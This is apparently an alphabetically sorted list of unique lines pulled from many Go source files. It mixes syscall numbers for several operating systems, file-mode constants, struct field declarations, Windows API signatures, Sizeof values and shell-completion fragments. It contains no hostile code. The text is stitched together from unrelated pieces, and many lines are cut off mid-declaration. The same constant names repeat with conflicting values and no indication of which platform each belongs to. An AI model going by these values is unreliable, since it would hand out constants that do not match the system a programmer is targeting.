SYS___SCALBN_H                      = 0xAE2
SYS___SCALB_B                       = 0x4F0
SYS___SCALB_H                       = 0x92D
SYS___SCANF_A                       = 0x702
SYS___SELECT1                       = 0x390
SYS___SEMCTL             = 442 // { int
SYS___SEMOP_TIMED                   = 0x5B8
SYS___SEMWAIT_SIGNAL               = 334
SYS___SEMWAIT_SIGNAL_NOCANCEL      = 423
SYS___SENDMSG2                      = 0x426
SYS___SENDMSG_A                     = 0x83A
SYS___SENDTO_A                      = 0x839
SYS___SERVER_CLASSIFY               = 0x490
SYS___SERVER_CLASSIFY_CREATE        = 0x48D
SYS___SERVER_CLASSIFY_DESTROY       = 0x48E
SYS___SERVER_CLASSIFY_RESET         = 0x48F
SYS___SERVER_INIT                   = 0x47F
SYS___SERVER_PWU                    = 0x480
SYS___SERVER_THREADS_QUERY          = 0x5B4
SYS___SETENV                        = 0x0C8
SYS___SETENV_A                      = 0x71B
SYS___SETHOOKEVENTS                 = 0x813
SYS___SETLOCALE_A                   = 0x6F9
SYS___SETLOGIN           = 50  // { int
SYS___SETUGID                = 374 // { int __setugid(int flag)
SYS___SET_EXCEPTION_HANDLER         = 0x8E2
SYS___SET_LAA_FOR_JIT               = 0x83F
SYS___SET_TCB      = 329 // { void sys___set_tcb(void 
SYS___SHUTDOWN_REGISTRATION         = 0x80F
SYS___SIGACTIONSET                  = 0x4FB
SYS___SIGACTION_SIGTRAMP = 340 // { int
SYS___SIGGM                         = 0x4A7
SYS___SIGNGAM                       = 0x379
SYS___SIGTIMEDWAIT       = 431 // { int
SYS___SIGWAIT                      = 330
SYS___SIGWAIT_NOCANCEL             = 422
SYS___SINF_B                        = 0x610
SYS___SINF_H                        = 0x92F
SYS___SINHF_B                       = 0x626
SYS___SINHF_H                       = 0x932
SYS___SINHL_B                       = 0x627
SYS___SINHL_H                       = 0x933
SYS___SINH_B                        = 0x4F1
SYS___SINH_H                        = 0x931
SYS___SINL_B                        = 0x611
SYS___SINL_H                        = 0x930
SYS___SINPID128                     = 0xC73
SYS___SINPID32                      = 0xC71
SYS___SINPID64                      = 0xC72
SYS___SIN_B                         = 0x4D6
SYS___SIN_H                         = 0x92E
SYS___SMF_RECORD                    = 0x48A
SYS___SMF_RECORD2                   = 0xD48
SYS___SNPRINTF_A                    = 0x8CD
SYS___SPAWN2                        = 0x49D
SYS___SPAWNP2                       = 0x49E
SYS___SPAWNP_A                      = 0x6C5
SYS___SPAWN_A                       = 0x6C3
SYS___SPRINTF_A                     = 0x6FB
SYS___SQRTF_B                       = 0x628
SYS___SQRTF_H                       = 0x935
SYS___SQRTL_B                       = 0x629
SYS___SQRTL_H                       = 0x936
SYS___SQRT_B                        = 0x4F2
SYS___SQRT_H                        = 0x934
SYS___SRCTRM                        = 0x2F4
SYS___SSCANF_A                      = 0x703
SYS___STATIC_REINIT                 = 0xB3D
SYS___STATVFS_A                     = 0x72B
SYS___STAT_A                        = 0x6EA
SYS___STAT_O_A                      = 0x6EB
SYS___STHOSTENT                     = 0x38B
SYS___STNETENT                      = 0x388
SYS___STPROTOENT                    = 0x389
SYS___STRCASECMP_A                  = 0x77B
SYS___STRCOLL_A                     = 0x69E
SYS___STRCOLL_C_A                   = 0x69F
SYS___STRCOLL_STD_A                 = 0x6A1
SYS___STRERROR_A                    = 0x711
SYS___STRFMON_A                     = 0x6BD
SYS___STRFMON_STD_A                 = 0x6BE
SYS___STRFTIME_A                    = 0x6CC
SYS___STRFTIME_STD_A                = 0x6CD
SYS___STRNCASECMP_A                 = 0x77C
SYS___STRPTIME_A                    = 0x6CE
SYS___STRPTIME_STD_A                = 0x6CF
SYS___STRPTM                        = 0x118
SYS___STRTOD_A                      = 0x708
SYS___STRTOLL_A                     = 0x7A3
SYS___STRTOL_A                      = 0x709
SYS___STRTOULL_A                    = 0x7A4
SYS___STRTOUL_A                     = 0x70A
SYS___STRXFRM_A                     = 0x6A2
SYS___STRXFRM_C_A                   = 0x6A3
SYS___STRXFRM_STD_A                 = 0x6A5
SYS___STSERVENT                     = 0x38A
SYS___SUPERKILL                     = 0x8A4
SYS___SVC99                         = 0x241
SYS___SWPRINTF_A                    = 0x700
SYS___SWSCANF_A                     = 0x704
SYS___SYMLINK_A                     = 0x72C
SYS___SYNTAX_INIT_A                 = 0x6D4
SYS___SYSCTL                 = 202 // { int __sysctl(int 
SYS___SYSCTL               = 202 // { int __sysctl(int 
SYS___SYSCTL             = 202 // { int
SYS___SYSLOG_A                      = 0x7BD
SYS___SYSTEM_A                      = 0x71C
SYS___TANF_B                        = 0x612
SYS___TANF_H                        = 0x938
SYS___TANHF_B                       = 0x614
SYS___TANHF_H                       = 0x93B
SYS___TANHL_B                       = 0x615
SYS___TANHL_H                       = 0x93C
SYS___TANH_B                        = 0x4D8
SYS___TANH_H                        = 0x93A
SYS___TANL_B                        = 0x613
SYS___TANL_H                        = 0x939
SYS___TAN_B                         = 0x4D7
SYS___TAN_H                         = 0x937
SYS___TCGETATTR_A                   = 0x8A1
SYS___TCGETCP                       = 0x37D
SYS___TCSETATTR_A                   = 0x8A2
SYS___TCSETCP                       = 0x37E
SYS___TCSETTABLES                   = 0x37F
SYS___TEMPNAM_A                     = 0x757
SYS___TERROR                        = 0x158
SYS___TFORK        = 8   // { int sys___tfork(const struct __tfork 
SYS___TGAMMAF_B                     = 0x863
SYS___TGAMMAF_H                     = 0x93E
SYS___TGAMMAF_H_C99                 = 0xB79
SYS___TGAMMAL_B                     = 0x865
SYS___TGAMMAL_H                     = 0xAE9
SYS___TGAMMA_B                      = 0x864
SYS___TGAMMA_H                      = 0x93D
SYS___TGAMMA_H_C99                  = 0xB78
SYS___THREXIT      = 302 // { void sys___threxit(pid_t 
SYS___THROW                         = 0x25E
SYS___THRSLEEP     = 94  // { int sys___thrsleep(const volatile void 
SYS___THRWAKEUP    = 301 // { int sys___thrwakeup(const volatile void 
SYS___TIME_INIT_A                   = 0x6CB
SYS___TMPFD        = 164 // { int sys___tmpfd(int flags)
SYS___TMPNAM_A                      = 0x752
SYS___TOASCII2                      = 0x383
SYS___TOCCSID                       = 0x662
SYS___TOCSNAME                      = 0x664
SYS___TOCSNAME2                     = 0xC9A
SYS___TOD_INIT_A                    = 0x6D5
SYS___TOLOWER_A                     = 0x73D
SYS___TOUPPER_A                     = 0x73E
SYS___TOWLOWER_A                    = 0x6B3
SYS___TOWLOWER_STD_A                = 0x6B4
SYS___TOWUPPER_A                    = 0x6B5
SYS___TOWUPPER_STD_A                = 0x6B6
SYS___TRRNO                         = 0x4AF
SYS___TRUNCATE_A                    = 0x72D
SYS___TRUNCF_B                      = 0x866
SYS___TRUNCF_H                      = 0x940
SYS___TRUNCL_B                      = 0x868
SYS___TRUNCL_H                      = 0x941
SYS___TRUNC_B                       = 0x867
SYS___TRUNC_H                       = 0x93F
SYS___TTYNAME_A                     = 0x77D
SYS___TTYNAME_R_A                   = 0x68F
SYS___TZNE                          = 0x4A9
SYS___TZONE                         = 0x2A0
SYS___TZSET_A                       = 0x79F
SYS___TZZN                          = 0x4AA
SYS___TZZNA                         = 0x7B4
SYS___T_ERRNO                       = 0x424
SYS___UCREATE                       = 0x4FC
SYS___UFREE                         = 0x4FE
SYS___UHEAPREPORT                   = 0x4FF
SYS___ULLTOA                        = 0x8AF
SYS___ULLTOA_A                      = 0x8B5
SYS___ULTOA                         = 0x8AD
SYS___ULTOA_A                       = 0x8B3
SYS___UMALLOC                       = 0x4FD
SYS___UMOUNT_A                      = 0x6F2
SYS___UNAME_A                       = 0x77E
SYS___UNGETWC_A                     = 0x7A9
SYS___UNLINK_A                      = 0x72E
SYS___UTIMES_A                      = 0x77F
SYS___UTIME_A                       = 0x7A0
SYS___UTMPXNAME                     = 0x314
SYS___UTOA                          = 0x8AB
SYS___UTOA_A                        = 0x8B1
SYS___UTXTRM                        = 0x2F3
SYS___VFPRINTF2_A                   = 0x7E7
SYS___VFPRINTF_A                    = 0x6FC
SYS___VHM_EVENT                     = 0x8E4
SYS___VPRINTF2_A                    = 0x7E8
SYS___VPRINTF_A                     = 0x6FD
SYS___VSNPRINTF_A                   = 0x8CE
SYS___VSPRINTF2_A                   = 0x7E9
SYS___VSPRINTF_A                    = 0x6FE
SYS___VSWPRINTF_A                   = 0x6FF
SYS___VSWPRNTF2_A                   = 0x7BB
SYS___WCSCOLL_A                     = 0x6A6
SYS___WCSCOLL_C_A                   = 0x6A7
SYS___WCSCOLL_STD_A                 = 0x6A8
SYS___WCSFTIME_A                    = 0x6D0
SYS___WCSFTIME_STD_A                = 0x6D1
SYS___WCSFTM                        = 0x403
SYS___WCSID                         = 0x117
SYS___WCSID_A                       = 0x682
SYS___WCSID_STD_A                   = 0x683
SYS___WCSTOD_A                      = 0x7D9
SYS___WCSTOK                        = 0x404
SYS___WCSTOL_A                      = 0x7DA
SYS___WCSTOMBS_A                    = 0x67A
SYS___WCSTOMBS_STD_A                = 0x67B
SYS___WCSTOUL_A                     = 0x7DB
SYS___WCSWIDTH_A                    = 0x67C
SYS___WCSWIDTH_ASIA                 = 0x67F
SYS___WCSWIDTH_STD_A                = 0x67E
SYS___WCSXFRM_A                     = 0x6A9
SYS___WCSXFRM_C_A                   = 0x6AA
SYS___WCSXFRM_STD_A                 = 0x6AB
SYS___WCTOB_A                       = 0x7E5
SYS___WCTOMB_A                      = 0x684
SYS___WCTOMB_ISO1                   = 0x685
SYS___WCTOMB_STD_A                  = 0x686
SYS___WCTOMB_UTF                    = 0x687
SYS___WCTYPE_A                      = 0x6AD
SYS___WCWDTH                        = 0x405
SYS___WCWIDTH_A                     = 0x688
SYS___WCWIDTH_ASIA                  = 0x68B
SYS___WCWIDTH_STD_A                 = 0x68A
SYS___WRITEDOWN                     = 0x841
SYS___WRITEV_A                      = 0x781
SYS___WSINIT                        = 0x483
SYS___W_GETMNTENT_A                 = 0x6F5
SYS___W_GETPSENT_A                  = 0x780
SYS___W_PIOCTL                      = 0x59E
SYS___W_STATFS_A                    = 0x782
SYS___W_STATVFS_A                   = 0x783
SYS___Y0_B                          = 0x4E5
SYS___Y0_H                          = 0x7F1
SYS___Y1_B                          = 0x4E7
SYS___Y1_H                          = 0x7F2
SYS___YN_B                          = 0x4E9
SYS___YN_H                          = 0x7F3
SYS_____AE_CORRESTBL_QUERY_A        = 0x70B
SYS_____CCSIDTYPE_A                 = 0x6E6
SYS_____CHATTR_A                    = 0x6E2
SYS_____CHECK_RESOURCE_AUTH_NP_A    = 0x765
SYS_____CONSOLE_A                   = 0x769
SYS_____CSNAMETYPE_A                = 0x6E7
SYS_____GETENV_A                    = 0x8C3
SYS_____LCHATTR_A                   = 0x83C
SYS_____LOGIN_A                     = 0x76E
SYS_____OPENDIR2_A                  = 0x7BF
SYS_____OPEN_STAT_A                 = 0x6ED
SYS_____OSNAME_A                    = 0x7E1
SYS_____PASSWD_A                    = 0x773
SYS_____READDIR2_A                  = 0x7C0
SYS_____SERVER_CLASSIFY_A           = 0x778
SYS_____SERVER_INIT_A               = 0x779
SYS_____SERVER_PWU_A                = 0x77A
SYS_____SPAWN2_A                    = 0x6D2
SYS_____SPAWNP2_A                   = 0x6D3
SYS_____TCGETCP_A                   = 0x82B
SYS_____TCSETCP_A                   = 0x82C
SYS_____TOCCSID_A                   = 0x6E4
SYS_____TOCSNAME_A                  = 0x6E5
SYS_____UTMPXNAME_A                 = 0x8CA
SYS_____W_PIOCTL_A                  = 0x82E
S_APPLICATION_ACTIVATION_ERROR_HANDLED_BY_DIALOG                          Handle        = 0x00270259
S_ARCH1                           = 0x10000
S_ARCH2                           = 0x20000
S_BANDURG                     = 0x400
S_BLKSIZE                                   = 0x200
S_BLKSIZE                         = 0x200
S_BLKSIZE                      = 0x200
S_EMODFMT                     = 0x3c000000
S_ENFMT                       = 0x400
S_ERROR                       = 0x100
S_FALSE                                                                   Handle        = 1
S_HANGUP                      = 0x200
S_HIPRI                       = 0x2
S_IAMB                        = 0x1ff
S_ICRYPTO                     = 0x80000
S_IEXEC                                     = 0x40
S_IEXEC                                 = 0x40
S_IEXEC                           = 0x40
S_IEXEC                         = S_IXUSR
S_IEXEC                        = 0x40
S_IEXEC                       = 0x40
S_IFAPFCTL                      = 0x00000004
S_IFBLK                                     = 0x6000
S_IFBLK                                 = 0x6000
S_IFBLK                           = 0x6000
S_IFBLK                         = 0x06000000
S_IFBLK                        = 0x6000
S_IFBLK                       = 0x6000
S_IFBLK  = 0x6000
S_IFCHR                                     = 0x2000
S_IFCHR                                 = 0x2000
S_IFCHR                           = 0x2000
S_IFCHR                         = 0x02000000
S_IFCHR                        = 0x2000
S_IFCHR                       = 0x2000
S_IFCHR  = 0x2000
S_IFDB                            = 0x9000
S_IFDIR                                     = 0x4000
S_IFDIR                                 = 0x4000
S_IFDIR                           = 0x4000
S_IFDIR                         = 0x01000000
S_IFDIR                        = 0x4000
S_IFDIR                       = 0x4000
S_IFDIR  = 0x4000
S_IFDOOR                      = 0xd000
S_IFEXTL                        = 0x00000001
S_IFFIFO                        = 0x04000000
S_IFIFO                                     = 0x1000
S_IFIFO                                 = 0x1000
S_IFIFO                           = 0x1000
S_IFIFO                         = 0x04000000
S_IFIFO                        = 0x1000
S_IFIFO                       = 0x1000
S_IFIFO  = 0x1000
S_IFJOURNAL                   = 0x10000
S_IFLNK                                     = 0xa000
S_IFLNK                                 = 0xa000
S_IFLNK                           = 0xa000
S_IFLNK                         = 0x05000000
S_IFLNK                        = 0xa000
S_IFLNK                       = 0xa000
S_IFLNK  = 0xa000
S_IFMPX                       = 0x2200
S_IFMST                         = 0x00FF0000
S_IFMT                                      = 0xf000
S_IFMT                                  = 0xf000
S_IFMT                            = 0xf000
S_IFMT                          = 0xFF000000
S_IFMT                         = 0xf000
S_IFMT                        = 0xf000
S_IFMT   = 0x1f000
S_IFNAM                       = 0x5000
S_IFNOSHARE                     = 0x00000008
S_IFPDIR                      = 0x4000000
S_IFPORT                      = 0xe000
S_IFPROGCTL                     = 0x00000002
S_IFPSDIR                     = 0x8000000
S_IFPSSDIR                    = 0xc000000
S_IFREG                                     = 0x8000
S_IFREG                                 = 0x8000
S_IFREG                           = 0x8000
S_IFREG                         = 0x03000000
S_IFREG                        = 0x8000
S_IFREG                       = 0x8000
S_IFREG  = 0x8000
S_IFSHARELIB                    = 0x00000010
S_IFSOCK                                    = 0xc000
S_IFSOCK                                = 0xc000
S_IFSOCK                          = 0xc000
S_IFSOCK                        = 0x07000000
S_IFSOCK                       = 0xc000
S_IFSOCK                      = 0xc000
S_IFSOCK = 0xc000
S_IFSYSEA                     = 0x30000000
S_IFVMEXTL                      = 0xFE000000
S_IFVMEXTL_DATA                 = 0x00020000
S_IFVMEXTL_EXEC                 = 0x00010000
S_IFVMEXTL_MEL                  = 0x00030000
S_IFWHT                                 = 0xe000
S_IFWHT                           = 0xe000
S_IFWHT                        = 0xe000
S_INPUT                       = 0x1
S_INSEM                       = 0x1
S_INSHD                       = 0x2
S_IREAD                                     = 0x100
S_IREAD                                 = 0x100
S_IREAD                           = 0x100
S_IREAD                         = S_IRUSR
S_IREAD                        = 0x100
S_IREAD                       = 0x100
S_IRGRP                                     = 0x20
S_IRGRP                                 = 0x20
S_IRGRP                           = 0x20
S_IRGRP                         = 0x0020
S_IRGRP                        = 0x20
S_IRGRP                       = 0x20
S_IROTH                                     = 0x4
S_IROTH                                 = 0x4
S_IROTH                           = 0x4
S_IROTH                         = 0x0004
S_IROTH                        = 0x4
S_IROTH                       = 0x4
S_IRUSR                                     = 0x100
S_IRUSR                                 = 0x100
S_IRUSR                           = 0x100
S_IRUSR                         = 0x0100
S_IRUSR                        = 0x100
S_IRUSR                       = 0x100
S_IRUSR  = 0x100
S_IRWXG                                     = 0x38
S_IRWXG                                 = 0x38
S_IRWXG                           = 0x38
S_IRWXG                         = 0x0038
S_IRWXG                        = 0x38
S_IRWXG                       = 0x38
S_IRWXO                                     = 0x7
S_IRWXO                                 = 0x7
S_IRWXO                           = 0x7
S_IRWXO                         = 0x0007
S_IRWXO                        = 0x7
S_IRWXO                       = 0x7
S_IRWXU                                     = 0x1c0
S_IRWXU                                 = 0x1c0
S_IRWXU                           = 0x1c0
S_IRWXU                         = 0x01C0
S_IRWXU                        = 0x1c0
S_IRWXU                       = 0x1c0
S_ISGID                                     = 0x400
S_ISGID                                 = 0x400
S_ISGID                           = 0x400
S_ISGID                         = 0x0400
S_ISGID                        = 0x400
S_ISGID                       = 0x400
S_ISGID  = 0x400
S_ISTXT                                 = 0x200
S_ISTXT                           = 0x200
S_ISTXT                        = 0x200
S_ISUID                                     = 0x800
S_ISUID                                 = 0x800
S_ISUID                           = 0x800
S_ISUID                         = 0x0800
S_ISUID                        = 0x800
S_ISUID                       = 0x800
S_ISUID  = 0x800
S_ISVTX                                     = 0x200
S_ISVTX                                 = 0x200
S_ISVTX                           = 0x200
S_ISVTX                         = 0x0200
S_ISVTX                        = 0x200
S_ISVTX                       = 0x200
S_ISVTX  = 0x200
S_ITCB                        = 0x1000000
S_ITP                         = 0x800000
S_IWGRP                                     = 0x10
S_IWGRP                                 = 0x10
S_IWGRP                           = 0x10
S_IWGRP                         = 0x0010
S_IWGRP                        = 0x10
S_IWGRP                       = 0x10
S_IWOTH                                     = 0x2
S_IWOTH                                 = 0x2
S_IWOTH                           = 0x2
S_IWOTH                         = 0x0002
S_IWOTH                        = 0x2
S_IWOTH                       = 0x2
S_IWRITE                                    = 0x80
S_IWRITE                                = 0x80
S_IWRITE                          = 0x80
S_IWRITE                        = S_IWUSR
S_IWRITE                       = 0x80
S_IWRITE                      = 0x80
S_IWRITE != 0 {
S_IWRITE = 0x80
S_IWRITE == 0 {
S_IWUSR                                     = 0x80
S_IWUSR                                 = 0x80
S_IWUSR                           = 0x80
S_IWUSR                         = 0x0080
S_IWUSR                        = 0x80
S_IWUSR                       = 0x80
S_IWUSR  = 0x80
S_IXACL                       = 0x2000000
S_IXATTR                      = 0x40000
S_IXGRP                                     = 0x8
S_IXGRP                                 = 0x8
S_IXGRP                           = 0x8
S_IXGRP                         = 0x0008
S_IXGRP                        = 0x8
S_IXGRP                       = 0x8
S_IXINTERFACE                 = 0x100000
S_IXMOD                       = 0x40000000
S_IXOTH                                     = 0x1
S_IXOTH                                 = 0x1
S_IXOTH                           = 0x1
S_IXOTH                         = 0x0001
S_IXOTH                        = 0x1
S_IXOTH                       = 0x1
S_IXUSR                                     = 0x40
S_IXUSR                                 = 0x40
S_IXUSR                           = 0x40
S_IXUSR                         = 0x0040
S_IXUSR                        = 0x40
S_IXUSR                       = 0x40
S_IXUSR  = 0x40
S_LOGIN_SET                       = 0x1
S_MSG                         = 0x8
S_OK                                                                      Handle        = 0
S_OUTPUT                      = 0x4
S_RDBAND                      = 0x20
S_RDNORM                      = 0x10
S_RESERVED1                   = 0x20000
S_RESERVED2                   = 0x200000
S_RESERVED3                   = 0x400000
S_RESERVED4                   = 0x80000000
S_RESFMT1                     = 0x10000000
S_RESFMT10                    = 0x34000000
S_RESFMT11                    = 0x38000000
S_RESFMT12                    = 0x3c000000
S_RESFMT2                     = 0x14000000
S_RESFMT3                     = 0x18000000
S_RESFMT4                     = 0x1c000000
S_RESFMT5                     = 0x20000000
S_RESFMT6                     = 0x24000000
S_RESFMT7                     = 0x28000000
S_RESFMT8                     = 0x2c000000
S_STORE_LAUNCHED_FOR_REMEDIATION                                          Handle        = 0x00270258
S_WRBAND                      = 0x80
S_WRNORM                      = 0x40
Sa_family        uint16
Sa_family    uint16
Sacked         uint32
Sal            uint16
Salt_ptr       uint64
Salt_size      uint32
Sample             uint64
Sample_max_stack   uint16
Sample_point uint32
Sample_regs_intr   uint64
Sample_regs_user   uint64
Sample_stack_user  uint32
Sample_type        uint64
Sc_family   uint8
Sc_id       uint32
Sc_len      uint8
Sc_reserved [5]uint32
Sc_unit     uint32
SchedulingClass         uint32
Scope              DICS_FLAG
Scope              DI_REMOVEDEVICE
Scope     uint8
Scope    int8
Scope    uint32
Scope    uint8
Scope int
Scope_id uint32
Sec         uint32
Sec       int64
Sec       uint32
Sec     uint32
Sec   int32
Sec   int64
Sec  int32
Sec  int64
Sec  uint32
Seclabel  [8]byte
Second       uint16
Secondary License
SecondarySigs    uint32
SecondaryWinsServer IpAddrString
Section          Handle
Sector uint64
Sector_bytes   uint16
Sector_start uint64
Sectors        uint16
Sectors   uint8
SecurityAnonymous      = 0
SecurityAttributes
SecurityAttributes {
SecurityAttributes) (err error) = CreateDirectoryW
SecurityAttributes) (err error) {
SecurityDelegation     = 3
SecurityDescriptor 
SecurityIdentification = 1
SecurityImpersonation  = 2
SecurityQoS        
SecurityScheme    int32
See 
See each sub-command's help for details on how to use the generated script.
See further below for more details on these deprecations.
See the License for the specific language governing permissions and
Seed_cnt      uint64
Seedsize uint32
Seekoff uint64
Segsz      uint32
Segsz  uint64
SemverRegexpRaw string = 
Sendpipe  uint64
Sendpipe uint32
Sendpipe uint64
Seq       int32
Seq      int32
Seq     TIPCServiceRange
Seq     int32
Seq   uint32
Seq  uint16
Seq  uint32
Seq_num             uint64
SerialNumber         CryptIntegerBlob
Serial_no      [20]uint8
Servent)(unsafe.Pointer(r0))
ServerInfo        
ServerName 
ServerPrincName    
ServiceFlags            uint32
ServiceFlags1     uint32
ServiceFlags2     uint32
ServiceFlags3     uint32
ServiceFlags4     uint32
ServiceName 
ServiceName          
ServiceName    string
ServiceNames          
ServicePackMajor  uint16
ServicePackMinor  uint16
ServiceProc uintptr
ServiceSpecificExitCode uint32
ServiceStartName 
ServiceStatus         SERVICE_STATUS_PROCESS
ServiceStatusProcess SERVICE_STATUS_PROCESS
ServiceType             uint32
ServiceType      uint32
Service_name     [63]uint8
Service_name_len uint32
Service_name_len uint64
Sess    uintptr
Session.vim
SessionID                    uint32
SessionID         uint32
SessionID uint32
SessionId              uint32
Set [4]uint64
Set(string) error
Set-PSReadLineKeyHandler -Key Tab -Function <mode>
SetCurrentDirectory(path 
SetDefaultDllDirectories(directoryFlags uint32) (err error)
SetDllDirectory(path string) (err error) = kernel32.SetDllDirectoryW
SetEndOfFile(handle Handle) (err error)
SetEnvironmentVariable(name 
SetErrorMode(mode uint32) (ret uint32) = kernel32.SetErrorMode
SetEvent(event Handle) (err error) = kernel32.SetEvent
SetFileAttributes(name 
SetThreadToken(thread 
SetVolumeLabel(rootPathName 
SetVolumeMountPoint(volumeMountPoint 
Setdomainname(p []byte) (err error)
Setegid(egid int) (err error)
Seteuid(euid int) (err error)
Setgid(gid int) (err error)
Setgid(uid int) (err error)
Setgid(uid int) (err error) = SYS_SETGID
Sethostname(p []byte) (err error)
Setlogin(name string) (err error)
Setprivexec(flag int) (err error)
Setrtable(rtable int) (err error)
Setsecret_cnt             uint64
Settimeofday(tp 
Settimeofday(tv 
Setuid(uid int) (err error)
Setuid(uid int) (err error) = SYS_SETUID
SetupDiCancelDriverInfoSearch(deviceInfoSet DevInfo) (err error) = setupapi.SetupDiCancelDriverInfoSearch
SetupDiDestroyDeviceInfoList(deviceInfoSet DevInfo) (err error) = setupapi.SetupDiDestroyDeviceInfoList
Sfd int32
SharedUmemFD uint32
Shared_umem_fd uint32
Sharedram uint32
Sharedram uint64
ShellCompDirectiveDefault
ShellCompDirectiveDefault ShellCompDirective = 0
ShellCompDirectiveError
ShellCompDirectiveError != 0 {
ShellCompDirectiveError ShellCompDirective = 1 << iota
ShellCompDirectiveFilterDirs
ShellCompDirectiveFilterDirs != 0 {
ShellCompDirectiveFilterFileExt
ShellCompDirectiveFilterFileExt != 0 {
ShellCompDirectiveNoFileComp
ShellCompDirectiveNoFileComp != 0 {
ShellCompDirectiveNoSpace
ShellCompDirectiveNoSpace != 0 {
Shift     int32
Short string
Shorthand           string              // one-letter abbreviated flag
Shorthand letters can be used with single dashes on the command line.
ShowWindow    uint16
Sid        
Sid                     
SidIdentifierAuthority) = advapi32.GetSidIdentifierAuthority
SidIdentifierAuthority) {
SidIdentifierAuthority)(unsafe.Pointer(r0))
SidTypeAlias
SidTypeComputer
SidTypeDeletedAccount
SidTypeDomain
SidTypeGroup
SidTypeInvalid
SidTypeLabel
SidTypeUnknown
SidTypeUser = 1 
SidTypeWellKnownGroup
Sig_ptr        uint64
Sig_size       uint32
Siginfo      __Siginfo
Siglist      Sigset_t
Sigmask      Sigset_t
Sign_cnt     uint64
Signature        uint32
SignatureAlgorithm   CryptAlgorithmIdentifier
SignatureSettings               
Signo     uint32
Signo    int32
Signo  int32
Signo int32
Sigwait     int32
SilenceErrors bool
SilenceUsage bool
Simplified code from 
Simply type 
Size                            uint32
Size                         uint32
Size                       uint32
Size                      uint32
Size                   uint32
Size               uint32
Size              Coord
Size              uint32
Size             uint32
Size            uint32
Size            uint64
Size           int64
Size           uint32
Size         int64
Size         uint32
Size        uint32
Size       int64
Size       uint32
Size      uint16
Size      uint32
Size     int32
Size     int64
Size     uint32
Size    int64
Size   uint64
Size  int32
Size  uint32
Size uint32
SizeOfImage uint32
Sizelimit        uint64
SizeofBpfHdr        = 0x14
SizeofBpfHdr        = 0x20
SizeofBpfHdr     = 0x14
SizeofBpfHdr     = 0x20
SizeofBpfInsn       = 0x8
SizeofBpfInsn    = 0x8
SizeofBpfProgram    = 0x10
SizeofBpfProgram    = 0x8
SizeofBpfProgram = 0x10
SizeofBpfProgram = 0x8
SizeofBpfStat       = 0x8
SizeofBpfStat    = 0x8
SizeofBpfStat    = 0x80
SizeofBpfVersion    = 0x4
SizeofBpfVersion = 0x4
SizeofBpfZbuf       = 0x18
SizeofBpfZbuf       = 0xc
SizeofBpfZbufHeader = 0x20
SizeofCanFilter         = 0x8
SizeofCanFilter))
SizeofCmsghdr           = 0xc
SizeofCmsghdr          = 0xc
SizeofCmsghdr         = 0x10
SizeofCmsghdr         = 0xc
SizeofCmsghdr       = 12
SizeofDmIoctl      = 0x138
SizeofDmTargetSpec = 0x28
SizeofICMPv6Filter      = 0x20
SizeofICMPv6Filter     = 0x20
SizeofICMPv6Filter  = 32
SizeofIPMreq            = 0x8
SizeofIPMreq           = 0x8
SizeofIPMreq        = 8
SizeofIPMreqn           = 0xc
SizeofIPMreqn          = 0xc
SizeofIPv6MTUInfo       = 0x20
SizeofIPv6MTUInfo      = 0x20
SizeofIPv6MTUInfo      = 0x24
SizeofIPv6MTUInfo   = 32
SizeofIPv6Mreq          = 0x14
SizeofIPv6Mreq         = 0x14
SizeofIPv6Mreq      = 20
SizeofIfAddrmsg    = 0x8
SizeofIfAnnounceMsghdr = 0x18
SizeofIfAnnounceMsghdr = 0x1a
SizeofIfData           = 0x50
SizeofIfData           = 0x60
SizeofIfData           = 0x84
SizeofIfData           = 0x88
SizeofIfData           = 0x90
SizeofIfData           = 0x98
SizeofIfData           = 0xa0
SizeofIfData           = 0xd4
SizeofIfData      = 0x60
SizeofIfData    = 0x44
SizeofIfInfomsg    = 0x10
SizeofIfMsghdr         = 0x60
SizeofIfMsghdr         = 0x70
SizeofIfMsghdr         = 0x98
SizeofIfMsghdr         = 0xa8
SizeofIfMsghdr         = 0xb0
SizeofIfMsghdr         = 0xec
SizeofIfMsghdr    = 0x70
SizeofIfMsghdr  = 0x54
SizeofIfMsghdr = 0x10
SizeofIfaCacheinfo = 0x10
SizeofIfaMsghdr        = 0x14
SizeofIfaMsghdr        = 0x18
SizeofIfaMsghdr   = 0x14
SizeofIfaMsghdr = 0x14
SizeofIfmaMsghdr       = 0x10
SizeofIfmaMsghdr  = 0x10
SizeofIfmaMsghdr2 = 0x14
SizeofInet4Pktinfo      = 0xc
SizeofInet4Pktinfo     = 0xc
SizeofInet6Pktinfo      = 0x14
SizeofInet6Pktinfo     = 0x14
SizeofInt      = 0x4
SizeofIovec             = 0x10
SizeofIovec            = 0x10
SizeofIovec            = 0x8
SizeofIovec           = 0x10
SizeofIovec           = 0x8
SizeofLinger            = 0x8
SizeofLinger           = 0x8
SizeofLinger        = 8
SizeofLong     = 0x4
SizeofLong     = 0x8
SizeofLong = 0x4
SizeofLong = 0x8
SizeofLongLong = 0x8
SizeofMsghdr            = 0x30
SizeofMsghdr           = 0x1c
SizeofMsghdr           = 0x30
SizeofMsghdr          = 0x1c
SizeofMsghdr          = 0x38
SizeofNdMsg        = 0xc
SizeofNdUseroptmsg = 0x10
SizeofNlAttr       = 0x4
SizeofNlMsgerr     = 0x14
SizeofNlMsghdr     = 0x10
SizeofPacketMreq        = 0x10
SizeofPtr      = 0x4
SizeofPtr      = 0x8
SizeofPtr  = 0x4
SizeofPtr  = 0x8
SizeofRawFileDedupeRange     = 0x18
SizeofRawFileDedupeRangeInfo = 0x20
SizeofRawFileDedupeRangeInfo)
SizeofRawFileDedupeRangeInfo)))
SizeofRtAttr       = 0x4
SizeofRtGenmsg     = 0x1
SizeofRtMetrics        = 0x38
SizeofRtMetrics        = 0x50
SizeofRtMetrics        = 0x70
SizeofRtMetrics   = 0x38
SizeofRtMetrics = 0x28
SizeofRtMsg        = 0xc
SizeofRtMsghdr         = 0x5c
SizeofRtMsghdr         = 0x60
SizeofRtMsghdr         = 0x78
SizeofRtMsghdr         = 0x98
SizeofRtMsghdr    = 0x5c
SizeofRtMsghdr  = 0x4c
SizeofRtNexthop    = 0x8
SizeofShort    = 0x2
SizeofSockFilter = 0x8
SizeofSockFprog = 0x10
SizeofSockFprog = 0x8
SizeofSockaddrALG       = 0x58
SizeofSockaddrAny       = 0x6c
SizeofSockaddrAny       = 0x70
SizeofSockaddrAny      = 0x404
SizeofSockaddrAny      = 0x6c
SizeofSockaddrAny      = 0xfc
SizeofSockaddrAny   = 128
SizeofSockaddrCAN       = 0x18
SizeofSockaddrCtl       = 0x20
SizeofSockaddrDatalink  = 0x14
SizeofSockaddrDatalink = 0x14
SizeofSockaddrDatalink = 0x20
SizeofSockaddrDatalink = 0x36
